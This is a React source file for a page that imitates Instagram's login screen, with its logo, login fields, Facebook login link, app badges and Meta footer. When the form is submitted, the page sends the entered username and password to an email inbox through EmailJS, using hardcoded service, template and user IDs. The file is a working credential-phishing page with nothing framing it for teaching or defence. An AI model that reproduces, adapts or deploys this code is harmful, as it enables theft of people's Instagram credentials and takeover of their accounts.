import React, { useState } from "react";
import "./styles/style.css";
import emailjs from "@emailjs/browser";

const App = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  // Login function that will send the username and password to email
  const login = (e) => {
    e.preventDefault(); // Prevent the page from reloading on form submit

    if (username === "" || password === "") {
      alert("Please enter valid data.");
    } else {
      // Prepare the data to be sent to the EmailJS template
      const emailData = {
        email: username,
        password: password,
      };

      // Send email using emailjs.send()
      emailjs
        .send(
          "service_xkr715v", // Your EmailJS service ID
          "template_yq52309", // Your EmailJS template ID
          emailData, // Data to be sent to the email template
          "74KeolM2HoT4R2LZ0" // Your EmailJS user ID
        )
        .then(
          (result) => {
            console.log(result.text);
            alert("Email sent successfully!");
          },
          (error) => {
            console.log(error.text);
            alert("There was an error sending the email.");
          }
        );
    }
  };

  return (
    <div>
      <div className="user-credential-div">
        <div className="box">
          <img
            className="instagram-logo"
            src="https://logos-world.net/wp-content/uploads/2020/04/Instagram-Logo-2010-2013.png"
            alt="Instagram Logo"
          />
          <form onSubmit={login}>
            <div>
              <input
                type="text"
                id="username"
                name="username"
                placeholder="Phone number, username, or Email"
                className="user-email-place"
                value={username}
                onChange={(e) => setUsername(e.target.value)} // Update the username state
              />
              <br />
              <br />
            </div>
            <div>
              <input
                type="password"
                id="password"
                name="password"
                placeholder="Password"
                className="user-password-place"
                value={password}
                onChange={(e) => setPassword(e.target.value)} // Update the password state
              />
              <br />
              <br />
            </div>
            <div>
              <button type="submit" className="login-button">
                <span>Log&nbsp;In</span>
              </button>
            </div>
            <div className="or-section">
              <div className="or-divider"></div>
              <div className="or-text">OR</div>
              <div className="or-divider"></div>
            </div>
            <a target="_blank" href="https://www.facebook.com/">
              <div className="facebook-section">
                <img
                  width="26"
                  height="26"
                  src="https://img.icons8.com/color/48/facebook.png"
                  alt="facebook"
                />
                <p className="facebook-login-text">Log in with Facebook</p>
              </div>
            </a>
            <a href="https://www.instagram.com/accounts/password/reset/">
              <h5>
                <p className="forgot-password-text">Forgot password?</p>
              </h5>
            </a>
          </form>
        </div>
      </div>

      <div className="sign-up-div">
        <p className="sign-up-text">
          Don't have an account?{" "}
          <span>
            <a className="bl-text" href="https://www.instagram.com/accounts/emailsignup/">
              Sign up
            </a>
          </span>
        </p>
      </div>

      <div className="get-app">
        <p className="get-app-text">Get the app.</p>
        <div className="app">
          <a
            target="_blank"
            href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3DC44D231A-101C-4AFA-B4A6-F5909E0BCA2B%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge&pli=1"
          >
            <img className="app-google" src="icons/google.png" alt="Google Play Store" />
          </a>
          <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt&referrer=appbadge&source=www.instagram.com&mode=mini&pos=0%2C0%2C2160%2C1368">
            <img className="app-microsoft" src="icons/microsoft.png" alt="Microsoft Store" />
          </a>
        </div>

        <footer>
          <h5>
            <div className="footer">
              <p className="first-line">
                <a target="_blank" className="f-line-elements" href="https://about.meta.com/">
                  <span>Meta</span>
                </a>
                <a target="_blank" className="f-line-elements" href="https://about.instagram.com/">
                  <span>About</span>
                </a>
              </p>
              <p className="second-line">
                <span className="s-line-elements">
                  English{" "}
                  <img
                    width="12"
                    height="12"
                    src="https://img.icons8.com/ios-glyphs/30/expand-arrow--v1.png"
                    alt="expand-arrow--v1"
                  />
                </span>
              </p>
            </div>
          </h5>
        </footer>
      </div>
    </div>
  );
};

export default App;
